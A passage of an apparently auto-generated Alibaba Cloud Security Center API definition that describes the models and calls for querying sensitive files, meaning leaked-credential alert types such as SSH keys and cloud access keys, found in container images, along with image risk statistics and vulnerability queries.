*   **hashicorp_terraform_token**: HashiCorp Terraform token
*   **jetbrains_ides**: JetBrains IDEs configuration
*   **heroku_api_key**: API key for Heroku
*   **messagebird_token**: MessageBird token
*   **github_app_token**: Github app token
*   **hashicorp_vault_token**: HashiCorp Vault token
*   **pgp_private_key**: PGP private key
*   **sshpasswd**: SSH password
*   **huaweicloud_ak**: secret access key of a third-party cloud
*   **aws_s3cmd**: AWS S3cmd configuration
*   **php_config**: PHP configuration
*   **common_private_key**: common private key
*   **microsoft_mdf**: Microsoft SQL Server database
*   **mediawiki_cfg**: MediaWiki configuration
*   **jenkins_cred**: Jenkins credential
*   **rubygems_cred**: RubyGems credential
*   **clojars_token**: Clojars token
*   **phoenix_web_passwd**: Phoenix web credential
*   **puttygen_private_key**: PuTTYgen private key
*   **google_oauth_token**: Google OAuth access token
*   **rubyonrails_cfg**: Ruby On Rails database configuration
*   **lob_api_key**: Lob API key for Lob
*   **pkcs_cred**: PKCS#12 certificate
*   **otr_private_key**: Off-the-Record Messaging (OTR) private key
*   **contentful_delivery_token**: Contentful delivery token
*   **digital_ocean_tugboat**: DigitalOcean Tugboat configuration
*   **dsa_private_key**: Digital Signature Algorithm (DSA) private key
*   **rails_app_token**: app token for Rails
*   **git_cred**: Git user credential
*   **newrelic_api_key**: User API key for New Relic
*   **github_hub**: hub configuration for storing GitHub tokens
*   **rubygem**: Rubygem Token', example='google_oauth_key'),
      sensitiveFileName?: string(name='SensitiveFileName', description='The name of the alert type for the sensitive file.', example='Google OAuth Key'),
    }
  ](name='SensitiveFileList', description='The information about the sensitive files.'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model DescribeImageSensitiveFileByKeyResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeImageSensitiveFileByKeyResponseBody(name='body'),
}

/**
 * @summary Queries the sensitive files in an image.
 *
 * @param tmpReq DescribeImageSensitiveFileByKeyRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeImageSensitiveFileByKeyResponse
 */
async function describeImageSensitiveFileByKeyWithOptions(tmpReq: DescribeImageSensitiveFileByKeyRequest, runtime: Util.RuntimeOptions): DescribeImageSensitiveFileByKeyResponse {
  Util.validateModel(tmpReq);
  var request = new DescribeImageSensitiveFileByKeyShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.scanRange)) {
    request.scanRangeShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.scanRange, 'ScanRange', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.imageUuid)) {
    query['ImageUuid'] = request.imageUuid;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.scanRangeShrink)) {
    query['ScanRange'] = request.scanRangeShrink;
  }
  if (!Util.isUnset(request.sensitiveFileKey)) {
    query['SensitiveFileKey'] = request.sensitiveFileKey;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageSensitiveFileByKey',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the sensitive files in an image.
 *
 * @param request DescribeImageSensitiveFileByKeyRequest
 * @return DescribeImageSensitiveFileByKeyResponse
 */
async function describeImageSensitiveFileByKey(request: DescribeImageSensitiveFileByKeyRequest): DescribeImageSensitiveFileByKeyResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageSensitiveFileByKeyWithOptions(request, runtime);
}

model DescribeImageSensitiveFileListRequest {
  criteria?: string(name='Criteria', description='The value of the sensitive file type.', example='Rails Master Key'),
  criteriaType?: string(name='CriteriaType', description='The type of the sensitive files that you want to query. Valid values:

*   **SensitiveFileKey**: the type of alerts for sensitive files. Valid values:

    *   **npm_token**: Node Package Manager (NPM) access token
    *   **ftp_cfg**: FTP configuration
    *   **google_oauth_key**: Google OAuth key
    *   **planetscale_passwd**: PlanetScale password
    *   **github_ssh_key**: Github SSH key
    *   **msbuild_publish_profile**: MSBuild publish profile
    *   **fastly_cdn_token**: Fastly CDN token
    *   **ssh_private_key**: SSH private key
    *   **aws_cli**: Amazon Web Services (AWS) CLI credentials
    *   **cpanel_proftpd**: cPanel ProFTPD credentials
    *   **postgresql_passwd**: PostgreSQL password
    *   **discord_client_cred**: Discord client credentials
    *   **rails_database**: Rails database configuration
    *   **aws_access_key**: AWS access key
    *   **esmtp_cfg**: Extended Simple Mail Transfer Protocol (ESMTP) configuration
    *   **docker_registry_cfg**: Docker image repository configuration
    *   **pem**: Privacy-Enhanced Mail (PEM)
    *   **common_cred**: common credentials
    *   **sftp_cfg**: Secure File Transfer Protocol (SFTP) connection configuration
    *   **grafana_token**: Grafana token
    *   **slack_token**: Slack token
    *   **ec_private_key**: EC private key
    *   **pypi_token**: upload token for the Python Package Index (PyPI)
    *   **finicity_token**: Finicity token
    *   **k8s_client_key**: Kubernetes private key
    *   **git_cfg**: Git configuration
    *   **django_key**: Django key
    *   **jenkins_ssh**: Jenkins SSH configuration file
    *   **openssh_private_key**: OpenSSL private key
    *   **square_oauth**: OAuth credential for Square
    *   **typeform_token**: Typeform token
    *   **common_database_cfg**: general database connection configuration
    *   **wordpress_database_cfg**: WordPress database configuration
    *   **googlecloud_api_key**: API key for Google Cloud
    *   **vscode_sftp**: VSCode SFTP configuration
    *   **apache_htpasswd**: Apache htpasswd
    *   **planetscale_token**: PlanetScale token
    *   **contentful_preview_token**: preview token for Contentful
    *   **php_database_cfg**: database password for a PHP application
    *   **atom_remote_sync**: Atom remote synchronization configuration
    *   **aws_session_token**: AWS session token
    *   **atom_sftp_cfg**: Atom SFTP configuration
    *   **asana_client_private_key**: Asana client key
    *   **tencentcloud_ak**: secret ID of a third-party cloud
    *   **rsa_private_key**: Rivest-Shamir-Adleman (RSA) private key
    *   **github_personal_token**: personal access token for GitHub
    *   **pgp**: Pretty Good Privacy (PGP) encrypted file
    *   **stripe_skpk**: Stripe secret key
    *   **square_token**: Square access token
    *   **rails_carrierwave**: file upload credentials for Rails Carrierwave
    *   **dbeaver_database_cfg**: DBeaver database configuration
    *   **robomongo_cred**: Robomongo credentials
    *   **github_oauth_token**: OAuth access token for GitHub
    *   **pulumi_token**: Pulumi token
    *   **ventrilo_voip**: Ventrilo VoIP server configuration
    *   **macos_keychain** :macOS keychain
    *   **amazon_mws_token**: Amazon MWS token
    *   **dynatrace_token**: Dynatrace token
    *   **java_keystore**: Java KeyStore (JKS)
    *   **microsoft_sdf**: Microsoft SQL Server Compact Edition (CE) database
    *   **kubernetes_dashboard_cred**: user credentials for Kubernetes Dashboard
    *   **atlassian_token**: Atlassian token
    *   **rdp**: remote desktop protocol (RDP)
    *   **mailgun_key**: Mailgun webhook signing key
    *   **mailchimp_api_key**: API key for Mailchimp
    *   **netrc_cfg**: .netrc configuration file
    *   **openvpn_cfg**: OpenVPN configuration
    *   **github_refresh_token**: GitHub refresh token
    *   **salesforce**: Salesforce credentials
    *   **salesforce**: Sendinblue credentials
    *   **pkcs_private_key**: PKCS#12 key
    *   **rubyonrails_passwd**: Ruby on Rails password file
    *   **filezilla_ftp**: FileZilla FTP configuration
    *   **databricks_token**: Databricks token
    *   **gitLab_personal_toke**: personal access token for GitLab
    *   **rails_master_key**: Rails master key
    *   **sqlite**: SQLite3 or SQLite database
    *   **firefox_logins**: Firefox logon configuration
    *   **mailgun_private_token**: Mailgun private token
    *   **joomla_cfg**: Joomla configuration
    *   **hashicorp_terraform_token**: HashiCorp Terraform token
    *   **jetbrains_ides**: JetBrains IDEs configuration
    *   **heroku_api_key**: Heroku API key
    *   **messagebird_token**: MessageBird token
    *   **messagebird_token**: MessageBird token
    *   **hashicorp_vault_token**: HashiCorp Vault token
    *   **pgp_private_key**: PGP private key
    *   **sshpasswd**: SSH password
    *   **huaweicloud_ak**: secret access key of a third-party cloud
    *   **aws_s3cmd**: AWS S3cmd configuration
    *   **php_config**: PHP configuration
    *   **common_private_key**: private key of a common type
    *   **microsoft_mdf**: Microsoft SQL Server database
    *   **mediawiki_cfg**: MediaWiki configuration
    *   **jenkins_cred**: Jenkins credentials
    *   **rubygems_cred**: RubyGems credentials
    *   **clojars_token**: Clojars token
    *   **phoenix_web_passwd**: Phoenix web credentials
    *   **puttygen_private_key**: PuTTYgen private key
    *   **google_oauth_token**: Google OAuth access token
    *   **rubyonrails_cfg**: Ruby On Rails database configuration
    *   **lob_api_key**: Lob API key
    *   **pkcs_cred**: PKCS#12 certificate
    *   **otr_private_key**: Off-the-Record Messaging (OTR) private key
    *   **contentful_delivery_token**: delivery token for Contentful
    *   **digital_ocean_tugboat**: DigitalOcean Tugboat configuration
    *   **dsa_private_key**: Digital Signature Algorithm (DSA) private key
    *   **rails_app_token**: Rails app token
    *   **git_cred**: Git user credential
    *   **newrelic_api_key**: User API key for New Relic
    *   **github_hub**: hub configuration for storing GitHub tokens
    *   **rubygem**: RubyGem token

*   **SensitiveFileName**: the name of the alert type for sensitive files.', example='SensitiveFileKey'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Pages start from page **1**. Default value: **1**.', example='1'),
  imageUuid?: string(name='ImageUuid', description='The UUID of the image.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation of Container Registry to query the image UUID from the value of the **ImageUuid** response parameter.', example='850613a48999900f48417c7e6e9dcfdd'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20.', example='20'),
  riskLevel?: string(name='RiskLevel', description='The risk level. Valid values:

*   **high**
*   **medium**
*   **low**', example='low'),
  scanRange?: [ string ](name='ScanRange', description='An array that consists of the types of the assets that you want to scan. Valid values:

*   **image**
*   **container**'),
}

model DescribeImageSensitiveFileListShrinkRequest {
  criteria?: string(name='Criteria', description='The value of the sensitive file type.', example='Rails Master Key'),
  criteriaType?: string(name='CriteriaType', description='The type of the sensitive files that you want to query. Valid values:

*   **SensitiveFileKey**: the type of alerts for sensitive files. Valid values:

    *   **npm_token**: Node Package Manager (NPM) access token
    *   **ftp_cfg**: FTP configuration
    *   **google_oauth_key**: Google OAuth key
    *   **planetscale_passwd**: PlanetScale password
    *   **github_ssh_key**: Github SSH key
    *   **msbuild_publish_profile**: MSBuild publish profile
    *   **fastly_cdn_token**: Fastly CDN token
    *   **ssh_private_key**: SSH private key
    *   **aws_cli**: Amazon Web Services (AWS) CLI credentials
    *   **cpanel_proftpd**: cPanel ProFTPD credentials
    *   **postgresql_passwd**: PostgreSQL password
    *   **discord_client_cred**: Discord client credentials
    *   **rails_database**: Rails database configuration
    *   **aws_access_key**: AWS access key
    *   **esmtp_cfg**: Extended Simple Mail Transfer Protocol (ESMTP) configuration
    *   **docker_registry_cfg**: Docker image repository configuration
    *   **pem**: Privacy-Enhanced Mail (PEM)
    *   **common_cred**: common credentials
    *   **sftp_cfg**: Secure File Transfer Protocol (SFTP) connection configuration
    *   **grafana_token**: Grafana token
    *   **slack_token**: Slack token
    *   **ec_private_key**: EC private key
    *   **pypi_token**: upload token for the Python Package Index (PyPI)
    *   **finicity_token**: Finicity token
    *   **k8s_client_key**: Kubernetes private key
    *   **git_cfg**: Git configuration
    *   **django_key**: Django key
    *   **jenkins_ssh**: Jenkins SSH configuration file
    *   **openssh_private_key**: OpenSSL private key
    *   **square_oauth**: OAuth credential for Square
    *   **typeform_token**: Typeform token
    *   **common_database_cfg**: general database connection configuration
    *   **wordpress_database_cfg**: WordPress database configuration
    *   **googlecloud_api_key**: API key for Google Cloud
    *   **vscode_sftp**: VSCode SFTP configuration
    *   **apache_htpasswd**: Apache htpasswd
    *   **planetscale_token**: PlanetScale token
    *   **contentful_preview_token**: preview token for Contentful
    *   **php_database_cfg**: database password for a PHP application
    *   **atom_remote_sync**: Atom remote synchronization configuration
    *   **aws_session_token**: AWS session token
    *   **atom_sftp_cfg**: Atom SFTP configuration
    *   **asana_client_private_key**: Asana client key
    *   **tencentcloud_ak**: secret ID of a third-party cloud
    *   **rsa_private_key**: Rivest-Shamir-Adleman (RSA) private key
    *   **github_personal_token**: personal access token for GitHub
    *   **pgp**: Pretty Good Privacy (PGP) encrypted file
    *   **stripe_skpk**: Stripe secret key
    *   **square_token**: Square access token
    *   **rails_carrierwave**: file upload credentials for Rails Carrierwave
    *   **dbeaver_database_cfg**: DBeaver database configuration
    *   **robomongo_cred**: Robomongo credentials
    *   **github_oauth_token**: OAuth access token for GitHub
    *   **pulumi_token**: Pulumi token
    *   **ventrilo_voip**: Ventrilo VoIP server configuration
    *   **macos_keychain** :macOS keychain
    *   **amazon_mws_token**: Amazon MWS token
    *   **dynatrace_token**: Dynatrace token
    *   **java_keystore**: Java KeyStore (JKS)
    *   **microsoft_sdf**: Microsoft SQL Server Compact Edition (CE) database
    *   **kubernetes_dashboard_cred**: user credentials for Kubernetes Dashboard
    *   **atlassian_token**: Atlassian token
    *   **rdp**: remote desktop protocol (RDP)
    *   **mailgun_key**: Mailgun webhook signing key
    *   **mailchimp_api_key**: API key for Mailchimp
    *   **netrc_cfg**: .netrc configuration file
    *   **openvpn_cfg**: OpenVPN configuration
    *   **github_refresh_token**: GitHub refresh token
    *   **salesforce**: Salesforce credentials
    *   **salesforce**: Sendinblue credentials
    *   **pkcs_private_key**: PKCS#12 key
    *   **rubyonrails_passwd**: Ruby on Rails password file
    *   **filezilla_ftp**: FileZilla FTP configuration
    *   **databricks_token**: Databricks token
    *   **gitLab_personal_toke**: personal access token for GitLab
    *   **rails_master_key**: Rails master key
    *   **sqlite**: SQLite3 or SQLite database
    *   **firefox_logins**: Firefox logon configuration
    *   **mailgun_private_token**: Mailgun private token
    *   **joomla_cfg**: Joomla configuration
    *   **hashicorp_terraform_token**: HashiCorp Terraform token
    *   **jetbrains_ides**: JetBrains IDEs configuration
    *   **heroku_api_key**: Heroku API key
    *   **messagebird_token**: MessageBird token
    *   **messagebird_token**: MessageBird token
    *   **hashicorp_vault_token**: HashiCorp Vault token
    *   **pgp_private_key**: PGP private key
    *   **sshpasswd**: SSH password
    *   **huaweicloud_ak**: secret access key of a third-party cloud
    *   **aws_s3cmd**: AWS S3cmd configuration
    *   **php_config**: PHP configuration
    *   **common_private_key**: private key of a common type
    *   **microsoft_mdf**: Microsoft SQL Server database
    *   **mediawiki_cfg**: MediaWiki configuration
    *   **jenkins_cred**: Jenkins credentials
    *   **rubygems_cred**: RubyGems credentials
    *   **clojars_token**: Clojars token
    *   **phoenix_web_passwd**: Phoenix web credentials
    *   **puttygen_private_key**: PuTTYgen private key
    *   **google_oauth_token**: Google OAuth access token
    *   **rubyonrails_cfg**: Ruby On Rails database configuration
    *   **lob_api_key**: Lob API key
    *   **pkcs_cred**: PKCS#12 certificate
    *   **otr_private_key**: Off-the-Record Messaging (OTR) private key
    *   **contentful_delivery_token**: delivery token for Contentful
    *   **digital_ocean_tugboat**: DigitalOcean Tugboat configuration
    *   **dsa_private_key**: Digital Signature Algorithm (DSA) private key
    *   **rails_app_token**: Rails app token
    *   **git_cred**: Git user credential
    *   **newrelic_api_key**: User API key for New Relic
    *   **github_hub**: hub configuration for storing GitHub tokens
    *   **rubygem**: RubyGem token

*   **SensitiveFileName**: the name of the alert type for sensitive files.', example='SensitiveFileKey'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Pages start from page **1**. Default value: **1**.', example='1'),
  imageUuid?: string(name='ImageUuid', description='The UUID of the image.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation of Container Registry to query the image UUID from the value of the **ImageUuid** response parameter.', example='850613a48999900f48417c7e6e9dcfdd'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20.', example='20'),
  riskLevel?: string(name='RiskLevel', description='The risk level. Valid values:

*   **high**
*   **medium**
*   **low**', example='low'),
  scanRangeShrink?: string(name='ScanRange', description='An array that consists of the types of the assets that you want to scan. Valid values:

*   **image**
*   **container**'),
}

model DescribeImageSensitiveFileListResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='1'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    lastRowKey?: string(name='LastRowKey', description='The key of the last data entry.', example='CAESGgoSChAKDGNvbXBsZXRlVGltZRABCgQiAggAGAAiQAoJAGYXFWIAAAAACjMDLgAAADFTNzMyZDMwMzAzMDM1Mzc3Njc4MzA2ODY5NmI2YTY1Nzg2NTcxNjE2NDc4NjE='),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: 20.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='149'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='8D19A089-E6BC-5244-800C-7E590D50487F'),
  sensitiveFileList?: [ 
    {
      advice?: string(name='Advice', description='The suggestion.', example='Assess risks based on business conditions, remove risky content.'),
      classKey?: string(name='ClassKey', description='The key of the sensitive file type.', example='password'),
      className?: string(name='ClassName', description='The name of the sensitive file type.', example='password'),
      count?: int32(name='Count', description='The number of scans that are performed on the sensitive file.', example='9'),
      description?: string(name='Description', description='The description of the sensitive file.', example='Verify the validity of the leaked AK.'),
      firstScanTime?: long(name='FirstScanTime', description='The timestamp generated when the first scan was performed. Unit: milliseconds.', example='1663321552000'),
      lastScanTime?: long(name='LastScanTime', description='The timestamp generated when the last scan was performed. Unit: milliseconds.', example='1663321552000'),
      riskLevel?: string(name='RiskLevel', description='The risk level. Valid values:

*   **high**
*   **medium**
*   **low**', example='high'),
      sensitiveFileKey?: string(name='SensitiveFileKey', description='The type of the alert for the sensitive file. Valid values:

*   **npm_token**: Node Package Manager (NPM) access token.
*   **ftp_cfg**: FTP configuration.
*   **google_oauth_key**: Google OAuth key.
*   **planetscale_passwd**: PlanetScale password.
*   **github_ssh_key**: GitHub SSH key.
*   **msbuild_publish_profile**: MSBuild publish profile.
*   **fastly_cdn_token**: Fastly CDN token.
*   **ssh_private_key**: SSH private key.
*   **aws_cli**: Amazon Web Services (AWS) CLI credential.
*   **cpanel_proftpd**: cPanel ProFTPD credential.
*   **postgresql_passwd**: PostgreSQL password file.
*   **discord_client_cred**: Discord client credential.
*   **rails_database**: Rails database configuration.
*   **aws_access_key**: AWS access key.
*   **esmtp_cfg**: Extended Simple Mail Transfer Protocol (ESMTP) configuration.
*   **docker_registry_cfg**: Docker image repository configuration.
*   **pem**: Privacy-Enhanced Mail (PEM).
*   **common_cred**: common credential.
*   **sftp_cfg**: Secure File Transfer Protocol (SFTP) connection configuration.
*   **grafana_token**: Grafana token.
*   **slack_token**: Slack token.
*   **ec_private_key**: EC private key.
*   **pypi_token**: upload token for the Python Package Index (PyPI).
*   **finicity_token**: Finicity token.
*   **k8s_client_key**: Kubernetes client private key.
*   **git_cfg**: Git configuration.
*   **django_key**: Django key.
*   **jenkins_ssh**: Jenkins SSH configuration file.
*   **openssh_private_key**: OpenSSH private key.
*   **square_oauth**: OAuth credential for Square.
*   **typeform_token**: Typeform token.
*   **common_database_cfg**: general database connection configuration.
*   **wordpress_database_cfg**: WordPress database configuration.
*   **googlecloud_api_key**: API key for Google Cloud.
*   **vscode_sftp**: VS Code SFTP configuration.
*   **apache_htpasswd**: Apache htpasswd.
*   **planetscale_token**: PlanetScale token.
*   **contentful_preview_token**: preview token for Contentful.
*   **php_database_cfg**: database password for a PHP application.
*   **atom_remote_sync**: Atom remote synchronization configuration.
*   **aws_session_token**: AWS session token.
*   **atom_sftp_cfg**: Atom SFTP configuration.
*   **asana_client_private_key**: Asana client key.
*   **tencentcloud_ak**: secret ID of a third-party cloud.
*   **rsa_private_key**: Rivest-Shamir-Adleman (RSA) private key.
*   **github_personal_token**: personal access token for GitHub.
*   **pgp**: Pretty Good Privacy (PGP) encrypted file.
*   **stripe_skpk**: Stripe secret key.
*   **square_token**: Square access token.
*   **rails_carrierwave**: file upload credential for Rails Carrierwave.
*   **dbeaver_database_cfg**: DBeaver database configuration.
*   **robomongo_cred**: Robomongo credential.
*   **github_oauth_token**: OAuth access token for GitHub.
*   **pulumi_token**: Pulumi token.
*   **ventrilo_voip**: Ventrilo VoIP server configuration.
*   **macos_keychain**: macOS keychain.
*   **amazon_mws_token**: Amazon MWS token.
*   **dynatrace_token**: Dynatrace token.
*   **java_keystore**: Java KeyStore (JKS).
*   **microsoft_sdf**: Microsoft SQL Server Compact Edition (CE) database.
*   **kubernetes_dashboard_cred**: user credential for Kubernetes Dashboard.
*   **atlassian_token**: Atlassian token.
*   **rdp**: remote desktop protocol (RDP).
*   **mailgun_key**: Mailgun webhook signing key.
*   **mailchimp_api_key**: API key for Mailchimp.
*   **netrc_cfg**: .netrc configuration file.
*   **openvpn_cfg**: OpenVPN client configuration.
*   **github_refresh_token**: GitHub refresh token.
*   **salesforce**: Salesforce credential.
*   **sendinblue**: Sendinblue token.
*   **pkcs_private_key**: PKCS#12 key.
*   **rubyonrails_passwd**: Ruby on Rails password file.
*   **filezilla_ftp**: FileZilla FTP configuration.
*   **databricks_token**: Databricks token.
*   **gitLab_personal_token**: personal access token for GitLab.
*   **rails_master_key**: Rails master key.
*   **sqlite**: SQLite3 or SQLite database.
*   **firefox_logins**: Firefox logon configuration.
*   **mailgun_private_token**: Mailgun private token.
*   **joomla_cfg**: Joomla configuration.
*   **hashicorp_terraform_token**: HashiCorp Terraform token.
*   **jetbrains_ides**: JetBrains IDEs configuration.
*   **heroku_api_key**: Heroku API key.
*   **messagebird_token**: MessageBird token.
*   **github_app_token**: GitHub app token.
*   **hashicorp_vault_token**: HashiCorp Vault token.
*   **pgp_private_key**: PGP private key.
*   **sshpasswd**: SSH password.
*   **huaweicloud_ak**: secret access key of a third-party cloud.
*   **aws_s3cmd**: AWS S3cmd configuration.
*   **php_config**: PHP configuration.
*   **common_private_key**: private key of a common type.
*   **microsoft_mdf**: Microsoft SQL Server database.
*   **mediawiki_cfg**: MediaWiki configuration.
*   **jenkins_cred**: Jenkins credential.
*   **rubygems_cred**: RubyGems credential.
*   **clojars_token**: Clojars token.
*   **phoenix_web_passwd**: Phoenix web credential.
*   **puttygen_private_key**: PuTTYgen private key.
*   **google_oauth_token**: Google OAuth access token.
*   **rubyonrails_cfg**: Ruby on Rails database configuration.
*   **lob_api_key**: Lob API key.
*   **pkcs_cred**: PKCS#12 certificate.
*   **otr_private_key**: Off-the-Record Messaging (OTR) private key.
*   **contentful_delivery_token**: delivery token for Contentful.
*   **digital_ocean_tugboat**: DigitalOcean Tugboat configuration.
*   **dsa_private_key**: Digital Signature Algorithm (DSA) private key.
*   **rails_app_token**: Rails app token.
*   **git_cred**: Git user credential.
*   **newrelic_api_key**: user API key for New Relic.
*   **github_hub**: hub configuration for storing GitHub tokens.
*   **rubygem**: RubyGems token.', example='google_oauth_key'),
      sensitiveFileName?: string(name='SensitiveFileName', description='The name of the alert type for the sensitive file.', example='AccessKeyLeak'),
      status?: int32(name='Status', description='The status of the sensitive file. Valid values:

*   **0**: unhandled.
*   **1**: handled.', example='0'),
      unprocessedNum?: int32(name='UnprocessedNum', description='The number of unprocessed mirrors.', example='2'),
    }
  ](name='SensitiveFileList', description='An array that consists of the information about the sensitive files.'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model DescribeImageSensitiveFileListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeImageSensitiveFileListResponseBody(name='body'),
}

/**
 * @summary Queries information about sensitive files.
 *
 * @param tmpReq DescribeImageSensitiveFileListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeImageSensitiveFileListResponse
 */
async function describeImageSensitiveFileListWithOptions(tmpReq: DescribeImageSensitiveFileListRequest, runtime: Util.RuntimeOptions): DescribeImageSensitiveFileListResponse {
  Util.validateModel(tmpReq);
  var request = new DescribeImageSensitiveFileListShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.scanRange)) {
    request.scanRangeShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.scanRange, 'ScanRange', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.criteriaType)) {
    query['CriteriaType'] = request.criteriaType;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.imageUuid)) {
    query['ImageUuid'] = request.imageUuid;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.riskLevel)) {
    query['RiskLevel'] = request.riskLevel;
  }
  if (!Util.isUnset(request.scanRangeShrink)) {
    query['ScanRange'] = request.scanRangeShrink;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageSensitiveFileList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries information about sensitive files.
 *
 * @param request DescribeImageSensitiveFileListRequest
 * @return DescribeImageSensitiveFileListResponse
 */
async function describeImageSensitiveFileList(request: DescribeImageSensitiveFileListRequest): DescribeImageSensitiveFileListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageSensitiveFileListWithOptions(request, runtime);
}

model DescribeImageStatisticsResponseBody = {
  instanceCount?: int32(name='InstanceCount', description='The number of container images in your assets. Only Container Registry Enterprise Edition instances are counted.', example='5'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4E5BFDCF-B9DD-430D-9DA4-151BCB581C9D'),
  riskInstanceCount?: int32(name='RiskInstanceCount', description='The number of container images that have security risks. Only Container Registry Enterprise Edition instances are counted.', example='2'),
}

model DescribeImageStatisticsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeImageStatisticsResponseBody(name='body'),
}

/**
 * @summary Queries the risk statistics on container images.
 *
 * @description Security Center can scan for security risks and collect statistics only for **Container Registry Enterprise Edition instances**.
 * >  Security Center cannot scan for security risks or collect statistics for **default** Container Registry instances.
 *
 * @param request DescribeImageStatisticsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeImageStatisticsResponse
 */
async function describeImageStatisticsWithOptions(runtime: Util.RuntimeOptions): DescribeImageStatisticsResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeImageStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the risk statistics on container images.
 *
 * @description Security Center can scan for security risks and collect statistics only for **Container Registry Enterprise Edition instances**.
 * >  Security Center cannot scan for security risks or collect statistics for **default** Container Registry instances.
 *
 * @return DescribeImageStatisticsResponse
 */
async function describeImageStatistics(): DescribeImageStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageStatisticsWithOptions(runtime);
}

model DescribeImageVulListRequest {
  aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='High severity vulnerability that affects org.eclipse.jetty:jetty-server'),
  clusterId?: string(name='ClusterId', description='The ID of the cluster to which the container belongs.', example='cc20a1024011c44b6a8710d6f8b****'),
  clusterName?: string(name='ClusterName', description='The name of the cluster.', example='docker-law'),
  containerId?: string(name='ContainerId', description='The ID of the container.', example='c08d5fc1a329a4b88950a253d082f****'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**', example='1'),
  dealed?: string(name='Dealed', description='Specifies whether the vulnerability is handled. Valid values:

*   **y**: handled
*   **n**: unhandled', example='y'),
  digest?: string(name='Digest', description='The digest of the image.', example='8f0fbdb41d3d1ade4ffdf21558443f4c03342010563bb8c43ccc09594d507012'),
  image?: string(name='Image', description='The name of the image.', example='registry.cn-wulanchabu.aliyuncs.com/sas_test/huxin-test-001:nuxeo6-****'),
